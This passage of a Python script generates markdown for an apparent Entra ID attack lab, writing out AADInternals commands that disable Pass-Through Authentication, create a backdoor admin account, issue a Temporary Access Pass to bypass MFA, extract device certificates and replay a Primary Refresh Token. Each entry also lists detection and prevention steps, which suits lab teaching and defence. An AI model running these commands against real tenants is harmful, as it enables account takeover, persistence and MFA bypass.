        "prev": "Enforce strict Tier 0 separation on the sync server and limit sync account privileges."
    },
    "CLO-091": {
        "name": "AADInternals Toolkit Attacks / Kill AD sync",
        "desc": "Abusing administrative permissions to disable Pass-Through Authentication or disrupt synchronization services via AADInternals.",
        "works": "Sync admin credentials compromised.",
        "tools": "AADInternals.",
        "steps": "Set-AADIntPassThroughAuthenticationEnabled -Enabled \\$false",
        "det": "Audit events indicating disabling of PTA or sync status changes.",
        "prev": "Restrict Hybrid Identity Administrator role assignments."
    },
    "CLO-092": {
        "name": "Create backdoor admin user in Entra ID",
        "desc": "Creating administrative accounts using compromised synchronization credentials to establish persistence.",
        "works": "Compromised write permission over the tenant directory.",
        "tools": "AADInternals.",
        "steps": "New-AADIntUser -UserPrincipalName backdoor@corplab.onmicrosoft.com -Password BackdoorPwd1 -DisplayName Backdoor -UserType Member",
        "det": "Creation of cloud-only administrative accounts without matching on-premises sync events.",
        "prev": "Enforce strict tenant user creation guidelines and alert on cloud-only admin creations."
    },
    "CLO-093": {
        "name": "Set temporary access pass (bypass MFA)",
        "desc": "Registering a Temporary Access Pass (TAP) on a victim's account to bypass Multi-Factor Authentication.",
        "works": "Administrative access to user authentication methods.",
        "tools": "AADInternals.",
        "steps": "New-AADIntUserTemporaryAccessPass -UserPrincipalName victim@corplab.onmicrosoft.com",
        "det": "Audit logs showing addition of Temporary Access Pass authentication methods.",
        "prev": "Restrict and monitor TAP policy configurations and assignments."
    },
    "CLO-094": {
        "name": "Extract Entra ID join device certificates",
        "desc": "Extracting device registration certificates for hybrid-joined endpoints to simulate trusted connections.",
        "works": "Read access allowed to device registration objects.",
        "tools": "AADInternals.",
        "steps": "Get-AADIntHybridDeviceCertificate",
        "det": "Directory queries requesting hybrid device certificate objects.",
        "prev": "Harden on-premises storage of device configuration values."
    },
    "CLO-095": {
        "name": "Pass-the-PRT",
        "desc": "Using a stolen Primary Refresh Token (PRT) to request access tokens, maintaining persistence without MFA.",
        "works": "PRT token stolen from CloudAP cache.",
        "tools": "AADInternals.",
        "steps": "Get-AADIntPRTToken -DeviceID <id> -Certificate <cert>",
        "det": "Successful logins using token signatures not matching local device telemetry.",
        "prev": "Enforce device compliance and restrict token lifetimes."
    }
}

# General stub generator
for i in range(1, 96):
    tag = f"CLO-{i:03d}"
    if tag in detailed_clo:
        info = detailed_clo[tag]
        section = f"""### {tag} — {info["name"]}
**What it is:** {info["desc"]}
**Why it works here:** {info["works"]}
**Tools:** {info["tools"]}
**Steps:**
```bash
{info["steps"]}
```
**Detection:** {info["det"]}
**Prevention:** {info["prev"]}"""
    else:
        # Determine category based on range
        if 11 <= i <= 20:
            cat = "Entra Connect Sync Gaps (Reserved / Placeholders)"
            desc = "Reserved sync engine configuration surface gap."
        elif 31 <= i <= 40:
            cat = "Hybrid Join and Device Enrollment Gaps (Reserved / Placeholders)"
            desc = "Reserved device registration and enrollment surface gap."
        elif 42 <= i <= 54:
            cat = "App Registration Gaps (Reserved / Placeholders)"
            desc = "Reserved App Registration API permission surface gap."
        elif 56 <= i <= 60:
            cat = "App Consent and API Permission Gaps (Reserved / Placeholders)"
            desc = "Reserved service principal and admin consent surface gap."
        elif 62 <= i <= 70:
            cat = "Conditional Access and Session Control Gaps (Reserved / Placeholders)"
            desc = "Reserved Conditional Access policy logic surface gap."
        elif 72 <= i <= 80:
            cat = "Token Storage and Transport Gaps (Reserved / Placeholders)"
            desc = "Reserved access/refresh token caching and transmission surface gap."
        elif 82 <= i <= 90:
            cat = "Hybrid Attack Path Gaps (Reserved / Placeholders)"
            desc = "Reserved cross-forest and hybrid escalation path surface gap."
        else:
            cat = "Cloud Identity Surface (Reserved / Placeholders)"
            desc = "Reserved cloud identity access surface gap."
            
        section = f"""### {tag} — {cat}
**What it is:** {desc}
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege."""
    clo_list.append(section)

clo_extra = "\n\n---\n\n".join(clo_list)

# Find the insertion point before the Next: [`04-lateral-movement.md`](04-lateral-movement.md)
# Let's search for "Next: [`04-lateral-movement.md`](04-lateral-movement.md)" in the content
insert_marker = "Next: [`04-lateral-movement.md`](04-lateral-movement.md)."

# Insert cred_extra and clo_extra
new_blocks = cred_extra + "\n\n" + clo_extra + "\n\n---\n\n" + insert_marker
content = content.replace(insert_marker, new_blocks)

# Write modified content back to the file
with open(filepath, "w", encoding="utf-8") as f:
    f.write(content)

print("docs/03-credential-access.md updated successfully!")
